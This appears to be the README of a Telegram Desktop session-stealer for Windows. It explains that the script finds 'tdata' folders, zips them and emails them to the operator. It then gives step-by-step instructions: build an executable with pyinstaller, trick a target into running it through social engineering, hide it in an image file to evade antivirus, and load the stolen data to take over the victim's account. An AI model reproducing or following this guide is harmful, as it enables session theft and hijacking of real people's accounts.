A tool to hack Telegram Desktop on Windows OS.
--------------------------------------------------------------------------------------------------------------------------------------------
what does this script do?

  It searches in drive C to find a "tdata" folder. after finding it, makes a zip file of some of its contents that we need to access
the telegram account, and it will doing this for each single "tdata" folder. after finishing this process, it will zip all of the
zip files into one. then sendes an email from a trial email to the reciever email (you) with the zip file attached.

How should you use it?

1: Change the reciever gmail to your gmail, so you can recieve the "tdata" folder files.

2: Export a .exe file from this .py file here usuing pyinstaller module.

3: Somehow, give the executable file to your target and tell him/her to click on it on his/her PC.
   3-a: You can use Social engineering methods to make the target execute the file.
   3-b: You can hide the .exe file in an image (.jpg, .jpeg, etc).
   
4: After the target executes the file, a couple of seconds will take to send you email!

5: Download and extrect the attached file. For each one of the recieving zip files, copy the tdata folder to your telegram desktop folder.

6: Congratulations you made it! Now you are in the target's account!!

Which Cases this tool wouldn't work?

1: Obviously, if the target doesn't have Telegram Desktop or uses another OS (not Windows)!!! 
   3-a: Maybe I decide to support linux OS in the next version!

2: If the target execute the file while he/she is offline :))

3: If there is an anti-virus software on the target's PC, depending on the software's power it may delete the .exe file.
   3-a: To solve this problem, you can hide the .exe file in an image as i mentioned before.
   3-b: I will try to solve this problem in the next version of the tool :))

Wanna help to improve the script?
Obviously, you can fork and clone the reposiory, make your changes and send a pull request.
